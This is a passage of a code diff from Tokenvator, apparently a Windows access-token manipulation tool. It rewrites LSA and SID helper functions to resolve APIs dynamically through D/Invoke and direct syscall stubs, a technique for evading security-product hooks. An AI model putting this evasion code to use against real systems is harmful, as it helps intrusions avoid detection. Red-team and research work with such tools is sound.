+            tokenPrivileges = new Winnt._TOKEN_PRIVILEGES_ARRAY();
             ntsecapi._LSA_UNICODE_STRING systemName = new ntsecapi._LSA_UNICODE_STRING();
             lsalookup._LSA_OBJECT_ATTRIBUTES lsaobjectAttributes = new lsalookup._LSA_OBJECT_ATTRIBUTES()
             {
@@ -624,23 +807,31 @@ namespace Tokenvator.Plugins.AccessTokens
                 SecurityDescriptor = IntPtr.Zero,
                 SecurityQualityOfService = IntPtr.Zero
             };
-
             IntPtr hPolicyHandle = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));
-            uint ntRetVal = advapi32.LsaOpenPolicy(
-                ref systemName,
-                ref lsaobjectAttributes,
-                (uint)lsalookup.LSA_ACCESS_MASK.POLICY_ALL_ACCESS,
-                out hPolicyHandle
-            );
-            if (0 != ntRetVal)
+
+            ////////////////////////////////////////////////////////////////////////////////
+            // advapi32.LsaOpenPolicy(ref systemName, ref lsaobjectAttributes, (uint)lsalookup.LSA_ACCESS_MASK.POLICY_ALL_ACCESS, out hPolicyHandle);
+            ////////////////////////////////////////////////////////////////////////////////
+            uint ntRetVal = 0;
+            try
             {
-                Misc.GetNtError("LsaOpenPolicy", ntRetVal);
+                ntRetVal = fLsaOpenPolicy(
+                    ref systemName,
+                    ref lsaobjectAttributes,
+                    (uint)lsalookup.LSA_ACCESS_MASK.POLICY_ALL_ACCESS,
+                    ref hPolicyHandle
+                );
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] LsaOpenPolicy Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
                 return false;
             }
 
-            if (IntPtr.Zero == hPolicyHandle)
+            if (0 != ntRetVal || IntPtr.Zero == hPolicyHandle)
             {
-                Misc.GetNtError("hPolicyHandle", ntRetVal);
+                Misc.GetNtError("LsaOpenPolicy", ntRetVal);
                 return false;
             }
 
@@ -666,9 +857,21 @@ namespace Tokenvator.Plugins.AccessTokens
                 j++;
             }
 
+            Marshal.FreeHGlobal(hPolicyHandle);
+
             return true;
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Creates the TOKEN_OWNER Structure
+        /// No Conversions Required
+        /// </summary>
+        /// <param name="domain"></param>
+        /// <param name="userName"></param>
+        /// <param name="tokenOwner"></param>
+        /// <returns></returns>
+        ////////////////////////////////////////////////////////////////////////////////
         private bool CreateTokenOwner(string domain, string userName, out Ntifs._TOKEN_OWNER tokenOwner)
         {
             Console.WriteLine("[*] _TOKEN_OWNER");
@@ -683,14 +886,23 @@ namespace Tokenvator.Plugins.AccessTokens
             return true;
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Creates the TOKEN_PRIMARY_GROUP Structure
+        /// No Conversions Required
+        /// Not Currently Used
+        /// </summary>
+        /// <param name="firstLocalgroupUserInfo"></param>
+        /// <param name="tokenPrimaryGroup"></param>
+        /// <returns></returns>
+        ////////////////////////////////////////////////////////////////////////////////
         private bool CreateTokenPrimaryGroup(string firstLocalgroupUserInfo, out Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup)
         {
             Console.WriteLine("_TOKEN_PRIMARY_GROUP");
             tokenPrimaryGroup = new Winnt._TOKEN_PRIMARY_GROUP()
             {
-                PrimaryGroup = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(System.IntPtr)))
+                PrimaryGroup = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)))
             };
-            
 
             if (!string.IsNullOrEmpty(firstLocalgroupUserInfo))
             {
@@ -698,15 +910,18 @@ namespace Tokenvator.Plugins.AccessTokens
                 _LookupSid(null, firstLocalgroupUserInfo, ref hSid);
                 tokenPrimaryGroup = (Winnt._TOKEN_PRIMARY_GROUP)Marshal.PtrToStructure(hSid, typeof(Winnt._TOKEN_PRIMARY_GROUP));
             }
-            else
-            {
-                //Everyone
-                //Winnt.SECURITY_NULL_SID_AUTHORITY
-                //InitializeSid(Winnt.SECURITY_NT_AUTHORITY, new uint[] { 32, 544, 0, 0, 0, 0, 0, 0 }, ref tokenPrimaryGroup.PrimaryGroup);
-            }
+
             return true;
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Creates the TOKEN_DEFAULT_DACL Structure
+        /// No Conversions Required
+        /// </summary>
+        /// <param name="tokenDefaultDacl"></param>
+        /// <returns></returns>
+        ////////////////////////////////////////////////////////////////////////////////
         private bool CreateTokenDefaultDACL(out Winnt._TOKEN_DEFAULT_DACL tokenDefaultDacl)
         {
             Console.WriteLine("[*] _TOKEN_DEFAULT_DACL");
@@ -718,11 +933,35 @@ namespace Tokenvator.Plugins.AccessTokens
             return true;
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Creates the TOKEN_SOURCE Structure
+        /// Converted to D/Invoke Syscalls
+        /// <param name="tokenSource"></param>
+        /// <returns></returns>
+        ////////////////////////////////////////////////////////////////////////////////
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
         private bool CreateTokenSource(out Winnt._TOKEN_SOURCE tokenSource)
         {
             Console.WriteLine("[*] _TOKEN_SOURCE");
             tokenSource = new Winnt._TOKEN_SOURCE();
-            uint ntRetVal = ntdll.NtAllocateLocallyUniqueId(ref tokenSource.SourceIdentifier);
+
+            IntPtr hNtAllocateLocallyUniqueId = Generic.GetSyscallStub("NtAllocateLocallyUniqueId");
+            MonkeyWorks.ntdll.NtAllocateLocallyUniqueId fSyscallNtAllocateLocallyUniqueId = (MonkeyWorks.ntdll.NtAllocateLocallyUniqueId)Marshal.GetDelegateForFunctionPointer(hNtAllocateLocallyUniqueId, typeof(MonkeyWorks.ntdll.NtAllocateLocallyUniqueId));
+
+            uint ntRetVal = 0;
+            try
+            {
+                ntRetVal = fSyscallNtAllocateLocallyUniqueId(ref tokenSource.SourceIdentifier);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] NtAllocateLocallyUniqueId Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+                return false;
+            }
+
             if (0 != ntRetVal)
             {
                 Misc.GetNtError("NtAllocateLocallyUniqueId", ntRetVal);
@@ -732,18 +971,42 @@ namespace Tokenvator.Plugins.AccessTokens
             return true;
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Looks up the right/privileges assigned to a user / group based on a policy
+        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
+        /// </summary>
+        /// <param name="hPolicyHandle"></param>
+        /// <param name="sid"></param>
+        /// <param name="rights"></param>
+        /// <returns></returns>
+        ////////////////////////////////////////////////////////////////////////////////
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
         private static bool _LookupRights(IntPtr hPolicyHandle, IntPtr sid, ref Dictionary<string, Winnt._LUID> rights)
         {
+            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
 
-            //Console.WriteLine(" - LsaEnumerateAccountRights");
+            ////////////////////////////////////////////////////////////////////////////////
+            // advapi32.LsaEnumerateAccountRights(hPolicyHandle, sid, out hUserRights, out countOfRights);
+            ////////////////////////////////////////////////////////////////////////////////
+            IntPtr hLsaEnumerateAccountRights = Generic.GetExportAddress(hadvapi32, "LsaEnumerateAccountRights");
+            MonkeyWorks.advapi32.LsaEnumerateAccountRights fLsaEnumerateAccountRights = (MonkeyWorks.advapi32.LsaEnumerateAccountRights)Marshal.GetDelegateForFunctionPointer(hLsaEnumerateAccountRights, typeof(MonkeyWorks.advapi32.LsaEnumerateAccountRights));
+
             IntPtr hUserRights;
             long countOfRights;
-            uint ntRetVal = advapi32.LsaEnumerateAccountRights(
-                hPolicyHandle,
-                sid,
-                out hUserRights,
-                out countOfRights
-            );
+
+            uint ntRetVal = 0;
+            try
+            {
+                ntRetVal = fLsaEnumerateAccountRights(hPolicyHandle, sid, out hUserRights, out countOfRights);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] LsaEnumerateAccountRights Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+                return false;
+            }
 
             //Weird Quirk
             countOfRights--;
@@ -766,46 +1029,104 @@ namespace Tokenvator.Plugins.AccessTokens
             ntsecapi._LSA_UNICODE_STRING[] userRights = new ntsecapi._LSA_UNICODE_STRING[countOfRights];
 
             ////////////////////////////////////////////////////////////////////////////////
-            ///
+            // advapi32.LookupPrivilegeValue(null, privilege, ref luid);
             ////////////////////////////////////////////////////////////////////////////////
+            IntPtr hLookupPrivilegeValueW = Generic.GetExportAddress(hadvapi32, "LookupPrivilegeValueW");
+            MonkeyWorks.advapi32.LookupPrivilegeValueW fLookupPrivilegeValueW = (MonkeyWorks.advapi32.LookupPrivilegeValueW)Marshal.GetDelegateForFunctionPointer(hLookupPrivilegeValueW, typeof(MonkeyWorks.advapi32.LookupPrivilegeValueW));
+
             for (int i = 0; i < countOfRights; i++)
             {
+                string privilege;
                 try
                 {
                     userRights[i] = (ntsecapi._LSA_UNICODE_STRING)Marshal.PtrToStructure(new IntPtr(hUserRights.ToInt64() + (i * Marshal.SizeOf(typeof(ntsecapi._LSA_UNICODE_STRING)))), typeof(ntsecapi._LSA_UNICODE_STRING));
-                    string privilege = Marshal.PtrToStringUni(userRights[i].Buffer);
-                    Winnt._LUID luid = new Winnt._LUID();
-                    bool retVal = advapi32.LookupPrivilegeValue(null, privilege, ref luid);
-                    if (!retVal)
-                    {
-                        Console.WriteLine("[-] Privilege Not Found");
-                        return false;
-                    }
-                    Console.WriteLine(" ({0}) {1}", i, privilege);
-                    rights[privilege] = luid;
-
+                    privilege = Marshal.PtrToStringUni(userRights[i].Buffer);
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine(ex);
-                    //return false;
+                    Console.WriteLine("[-] PtrToStructure Generated an Exception");
+                    Console.WriteLine("[-] {0}", ex.Message);
+                    continue;
                 }
+
+                Winnt._LUID luid = new Winnt._LUID();
+                bool retVal = false;
+                try
+                {
+                    retVal = fLookupPrivilegeValueW(null, privilege, ref luid);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("[-] LookupPrivilegeValueW Generated an Exception");
+                    Console.WriteLine("[-] {0}", ex.Message);
+                    continue;
+                }
+
+                if (!retVal)
+                {
+                    Console.WriteLine("[-] Privilege Not Found");
+                    continue;
+                }
+                Console.WriteLine(" ({0}) {1}", i, privilege);
+                rights[privilege] = luid;
+
+
             }
             return true;
         }
 
-        private static void _PrintStringSID(IntPtr hSid)
+        ////////////////////////////////////////////////////////////////////////////////
+        /// <summary>
+        /// Currently unused but useful for debugging
+        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
+        /// </summary>
+        /// <param name="hSid"></param>
+        ////////////////////////////////////////////////////////////////////////////////
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
+        private static string _PrintStringSID(IntPtr hSid)
         {
+            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
+            IntPtr hConvertSidToStringSidW = Generic.GetExportAddress(hadvapi32, "ConvertSidToStringSidW");
+            MonkeyWorks.advapi32.ConvertSidToStringSidW fConvertSidToStringSidW = (MonkeyWorks.advapi32.ConvertSidToStringSidW)Marshal.GetDelegateForFunctionPointer(hConvertSidToStringSidW, typeof(MonkeyWorks.advapi32.ConvertSidToStringSidW));
+
             IntPtr hStringUserSid = IntPtr.Zero;
-            advapi32.ConvertSidToStringSid(hSid, ref hStringUserSid);
-            Console.WriteLine(Marshal.PtrToStringAuto(hStringUserSid));
+            try
+            {
+                Ntifs._SID sid = (Ntifs._SID)Marshal.PtrToStructure(hSid, typeof(Ntifs._SID));
+                fConvertSidToStringSidW(ref sid, ref hStringUserSid);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] ConvertSidToStringSidW Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+                return string.Empty;
+            }
+
+            return Marshal.PtrToStringUni(hStringUserSid);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // SID Lookup Wrapper
+        /// <summary>
+        /// SID Lookup Wrapper
+        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
+        /// </summary>
+        /// <param name="logonDomain"></param>
+        /// <param name="userName"></param>
+        /// <param name="hSid"></param>
+        /// <returns></returns>
         ////////////////////////////////////////////////////////////////////////////////
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
         private static bool _LookupSid(string logonDomain, string userName, ref IntPtr hSid)
         {
+            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
+
+            ////////////////////////////////////////////////////////////////////////////////
+            //advapi32.LookupAccountName(lpSystemName, lpAccountName, hSid, ref cbSid, lpReferencedDomainName, ref cchReferencedDomainName, out peUse);
+            ////////////////////////////////////////////////////////////////////////////////
+            IntPtr hLookupAccountNameW = Generic.GetExportAddress(hadvapi32, "LookupAccountNameW");
+            MonkeyWorks.advapi32.LookupAccountNameW fLookupAccountNameW = (MonkeyWorks.advapi32.LookupAccountNameW)Marshal.GetDelegateForFunctionPointer(hLookupAccountNameW, typeof(MonkeyWorks.advapi32.LookupAccountNameW));
 
             StringBuilder lpSystemName = new StringBuilder(logonDomain);
             StringBuilder lpAccountName = new StringBuilder(userName);
@@ -814,29 +1135,47 @@ namespace Tokenvator.Plugins.AccessTokens
             uint cchReferencedDomainName = 0;
             Winnt._SID_NAME_USE peUse = new Winnt._SID_NAME_USE();
 
-            //Console.WriteLine(" - LookupAccountName");
-            advapi32.LookupAccountName(
-                lpSystemName,
-                lpAccountName,
-                hSid,
-                ref cbSid,
-                lpReferencedDomainName,
-                ref cchReferencedDomainName,
-                out peUse
-            );
+            try
+            {
+                fLookupAccountNameW(
+                    lpSystemName,
+                    lpAccountName,
+                    hSid,
+                    ref cbSid,
+                    lpReferencedDomainName,
+                    ref cchReferencedDomainName,
+                    out peUse
+                );
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] LookupAccountNameW Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+            }
 
             hSid = Marshal.AllocHGlobal((int)cbSid);
             lpReferencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
 
-            bool retVal = advapi32.LookupAccountName(
-                lpSystemName,
-                lpAccountName,
-                hSid,
-                ref cbSid,
-                lpReferencedDomainName,
-                ref cchReferencedDomainName,
-                out peUse
-            );
+            bool retVal = false;
+            try
+            {
+                retVal = fLookupAccountNameW(
+                    lpSystemName,
+                    lpAccountName,
+                    hSid,
+                    ref cbSid,
+                    lpReferencedDomainName,
+                    ref cchReferencedDomainName,
+                    out peUse
+                );
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] LookupAccountNameW Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+                Marshal.FreeHGlobal(hSid);
+                return false;
+            }
 
             if (!retVal)
             {
@@ -844,32 +1183,78 @@ namespace Tokenvator.Plugins.AccessTokens
                 return false;
             }
 
+            string sddl = _PrintStringSID(hSid);
+            /*
+            ///////////////////////////////////////////////////////////////////////////////
+            //advapi32.ConvertSidToStringSid(hSid, ref hStringUserSid);
+            ///////////////////////////////////////////////////////////////////////////////
+            IntPtr hConvertSidToStringSidW = Generic.GetExportAddress(hadvapi32, "ConvertSidToStringSidW");
+            MonkeyWorks.advapi32.ConvertSidToStringSidW fConvertSidToStringSidW = (MonkeyWorks.advapi32.ConvertSidToStringSidW)Marshal.GetDelegateForFunctionPointer(hConvertSidToStringSidW, typeof(MonkeyWorks.advapi32.ConvertSidToStringSidW));
+
             IntPtr hStringUserSid = IntPtr.Zero;
-            advapi32.ConvertSidToStringSid(hSid, ref hStringUserSid);
+
+            try
+            {
+                fConvertSidToStringSidW(ref hSid, ref hStringUserSid);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] LookupAccountNameW Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+            }
             string sddl = Marshal.PtrToStringAuto(hStringUserSid);
+            
+            */
             Console.WriteLine(" [+] {0} {1}", sddl, lpAccountName.ToString());
 
             return true;
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Wrapper for AllocateAndInitializeSid - Hardest Possible way of doing it
+        /// <summary>
+        /// Wrapper for AllocateAndInitializeSid - Hardest Possible way of doing it
+        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
+        /// </summary>
+        /// <param name="authority"></param>
+        /// <param name="subAuthority"></param>
+        /// <param name="psid"></param>
+        /// <returns></returns>
         ////////////////////////////////////////////////////////////////////////////////
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
         private static bool InitializeSid(Winnt._SID_IDENTIFIER_AUTHORITY authority, uint[] subAuthority, ref IntPtr psid)
         {
-            //Console.WriteLine("AllocateAndInitializeSid");
-            bool retVal = advapi32.AllocateAndInitializeSid(
-                ref authority,
-                1,
-                subAuthority[0],
-                subAuthority[1],
-                subAuthority[2],
-                subAuthority[3],
-                subAuthority[4],
-                subAuthority[5],
-                subAuthority[6],
-                subAuthority[7],
-                out psid);
+            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
+
+            ////////////////////////////////////////////////////////////////////////////////
+            // fAllocateAndInitializeSid(ref authority, 1, subAuthority[0], subAuthority[1], subAuthority[2], subAuthority[3], subAuthority[4], subAuthority[5], subAuthority[6], subAuthority[7], out psid);
+            ////////////////////////////////////////////////////////////////////////////////
+            IntPtr hAllocateAndInitializeSid = Generic.GetExportAddress(hadvapi32, "AllocateAndInitializeSid");
+            MonkeyWorks.advapi32.AllocateAndInitializeSid fAllocateAndInitializeSid = (MonkeyWorks.advapi32.AllocateAndInitializeSid)Marshal.GetDelegateForFunctionPointer(hAllocateAndInitializeSid, typeof(MonkeyWorks.advapi32.AllocateAndInitializeSid));
+
+            bool retVal = false;
+            try
+            {
+                retVal = fAllocateAndInitializeSid(
+                    ref authority,
+                    1,
+                    subAuthority[0],
+                    subAuthority[1],
+                    subAuthority[2],
+                    subAuthority[3],
+                    subAuthority[4],
+                    subAuthority[5],
+                    subAuthority[6],
+                    subAuthority[7],
+                    out psid
+                );
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] AllocateAndInitializeSid Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+                return false;
+            }
 
             if (!retVal)
             {
@@ -877,18 +1262,20 @@ namespace Tokenvator.Plugins.AccessTokens
                 return false;
             }
 
-            IntPtr hStringUserSid = IntPtr.Zero;
-            advapi32.ConvertSidToStringSid(psid, ref hStringUserSid);
-            string sddl = Marshal.PtrToStringAuto(hStringUserSid);
+            ////////////////////////////////////////////////////////////////////////////////
+            // advapi32.ConvertSidToStringSid(psid, ref hStringUserSid);
+            ////////////////////////////////////////////////////////////////////////////////
+            string sddl = _PrintStringSID(psid);
+
             string accountName = string.Empty;
             try
             {
-                accountName = new System.Security.Principal.SecurityIdentifier(sddl)
-                    .Translate(typeof(System.Security.Principal.NTAccount)).ToString();
+                accountName = new SecurityIdentifier(sddl).Translate(typeof(NTAccount)).ToString();
             }
-            catch (System.Security.Principal.IdentityNotMappedException ex)
+            catch (IdentityNotMappedException ex)
             {
-                Console.WriteLine(ex.Message);
+                Console.WriteLine("[-] SecurityIdentifier.Translate Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
             }
 
             Console.WriteLine("   - " + accountName + " " + sddl);
@@ -896,11 +1283,37 @@ namespace Tokenvator.Plugins.AccessTokens
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Wrapper for AllocateAndInitializeSid
+        /// <summary>
+        /// Wrapper for AllocateAndInitializeSid
+        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
+        /// </summary>
+        /// <param name="sddl"></param>
+        /// <param name="psid"></param>
+        /// <returns></returns>
         ////////////////////////////////////////////////////////////////////////////////
+        [SecurityCritical]
+        [HandleProcessCorruptedStateExceptions]
         public static bool InitializeSid(string sddl, ref IntPtr psid)
         {
-            bool retVal = advapi32.ConvertStringSidToSidW(sddl, ref psid);
+            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
+
+            ////////////////////////////////////////////////////////////////////////////////
+            // bool retVal = advapi32.ConvertStringSidToSidW(sddl, ref psid);
+            ////////////////////////////////////////////////////////////////////////////////
+            IntPtr hConvertStringSidToSidW = Generic.GetExportAddress(hadvapi32, "ConvertStringSidToSidW");
+            MonkeyWorks.advapi32.ConvertStringSidToSidW fConvertStringSidToSidW = (MonkeyWorks.advapi32.ConvertStringSidToSidW)Marshal.GetDelegateForFunctionPointer(hConvertStringSidToSidW, typeof(MonkeyWorks.advapi32.ConvertStringSidToSidW));
+
+            bool retVal = false;
+            try
+            {
+                retVal = fConvertStringSidToSidW(sddl, ref psid);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[-] ConvertStringSidToSidW Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
+                return false;
+            }
 
             if (!retVal)
             {
@@ -915,10 +1328,11 @@ namespace Tokenvator.Plugins.AccessTokens
             }
             catch (IdentityNotMappedException ex)
             {
-                Console.WriteLine(ex.Message);
+                Console.WriteLine("[-] SecurityIdentifier.Translate Generated an Exception");
+                Console.WriteLine("[-] {0}", ex.Message);
             }
 
-            Console.WriteLine(" [+] {0} {1}", sddl, accountName);
+            Console.WriteLine(" [+] {0,-20} {1}", sddl, accountName);
             return true;
         }
     }
